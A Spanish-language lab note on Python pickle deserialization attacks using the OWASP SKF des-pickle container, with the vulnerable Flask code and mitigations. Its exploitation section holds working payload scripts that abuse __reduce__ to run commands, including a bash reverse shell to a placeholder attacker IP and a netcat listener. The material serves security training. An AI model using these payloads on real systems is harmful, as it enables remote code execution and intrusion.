# 💥 Ataques de Deserialización

> Parte de [[OWASP]]  
> La teoría viene de [[Ataques de Deserialización]]
> Glosario relacionado: [[Serialización y Deserialización]]

## ¿Qué es Pickle?

Pickle es un módulo de Python que permite la **serialización y deserialización** de objetos Python. Serializar significa convertir un objeto en una secuencia de bytes que puede ser almacenada o transmitida, mientras que deserializar es el proceso inverso, reconstruyendo el objeto original a partir de esos bytes.

Pickle es particularmente útil para:
- Guardar el estado de un programa
- Transmitir objetos complejos a través de la red
- Almacenar estructuras de datos complejas

Sin embargo, Pickle tiene un **grave problema de seguridad**: al deserializar datos no confiables, puede ejecutar código arbitrario. Esto ocurre porque Pickle reconstruye objetos ejecutando funciones específicas durante el proceso de deserialización.

**Advertencia de seguridad**: Nunca deserialices datos que no sean de confianza con Pickle. Para datos no confiables, considera formatos más seguros como JSON.

---
# Práctica: Laboratorio de Deserialización Insegura

## Configuración del Entorno

Podemos usar el laboratorio de SKFLabs, ya sea clonando el repositorio o usando Docker:

```sh
docker pull blabla1337/owasp-skf-lab:des-pickle
```

Luego desplegamos el contenedor con port forwarding:

```sh
docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-pickle
```

Explicación de los flags:
- `-d`: Ejecuta el contenedor en segundo plano (detached mode)
- `-p`: Especifica el port forwarding (host:container)
- `-i`: Mantiene STDIN abierto incluso si no está conectado (interactive)
- `-t`: Asigna una pseudo-TTY (terminal)

## Análisis del Código Vulnerable

El código fuente de la aplicación vulnerable:

```python
import pickle
from flask import Flask, request, render_template

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True

@app.route("/")
def start():
        user = {'name': 'ZeroCool'}
        with open('filename.pickle', 'wb') as handle:
            pickle.dump(user, handle, protocol=pickle.HIGHEST_PROTOCOL)
        with open('filename.pickle', 'rb') as handle:
            a = pickle.load(handle)
        return render_template("index.html", content = a)

@app.route("/sync", methods=['POST'])
def deserialization():
        with open("pickle.hacker", "wb+") as file:
            att = request.form['data_obj']
            attack = bytes.fromhex(att)
            file.write(attack)
            file.close()
        with open('pickle.hacker', 'rb') as handle:
            a = pickle.load(handle)
            print(attack)
            return render_template("index.html", content = a)

@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```

### Vulnerabilidad Identificada

1. La aplicación acepta datos serializados a través del parámetro `data_obj` en la ruta `/sync`
2. Convierte estos datos de hexadecimal a bytes y los escribe en un archivo
3. Deserializa el contenido del archivo usando `pickle.load()` sin ninguna validación
4. La función `__reduce__` de Pickle permite ejecutar código arbitrario durante la deserialización

## Explotación de la Vulnerabilidad

### Ejemplo Básico: Ejecución de Comandos

```python
import pickle
import os
import binascii

class Evil:
    def __reduce__(self):
        return (os.system, ("id",))

if __name__ == "__main__":
    evil = Evil()
    evil_pickled = pickle.dumps(evil)
    
    # Enviar el objeto malicioso al servidor
    print(binascii.hexlify(evil_pickled))
```

Al enviar el payload hexadecimal resultante, el servidor ejecutará el comando `id`. Aunque el laboratorio solo muestra un `0` (código de estado), esto confirma la ejecución remota de comandos.

### Escalando a Reverse Shell

Podemos crear una reverse shell usando el famoso one-liner:

```python
import pickle
import os
import binascii

class Evil:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/[IP_ATACANTE]/[PUERTO] 0>&1"',))

if __name__ == "__main__":
    evil = Evil()
    evil_pickled = pickle.dumps(evil)
    
    # Enviar el objeto malicioso al servidor
    print(binascii.hexlify(evil_pickled))
```

Pasos para la explotación:
1. Sustituir `[IP_ATACANTE]` y `[PUERTO]` por tus valores
2. Ejecutar el script para generar el payload
3. Poner en escucha tu máquina con netcat: `nc -lvnp [PUERTO]`
4. Enviar el payload hexadecimal a la aplicación vulnerable
5. Recibirás una shell interactiva en tu máquina atacante

## Mitigaciones

1. **Evitar deserializar datos no confiables**: Usar formatos alternativos como JSON
2. **Validación estricta**: Si es imprescindible usar Pickle, implementar controles estrictos
3. **Sandboxing**: Ejecutar el proceso de deserialización en un entorno aislado
4. **Firmas digitales**: Verificar la integridad de los datos serializados

## Conclusión

Los ataques de deserialización son extremadamente peligrosos ya que pueden llevar a la ejecución remota de código. Pickle, aunque potente, no debe usarse con datos no confiables. Siempre preferir alternativas seguras y aplicar el principio de mínimo privilegio.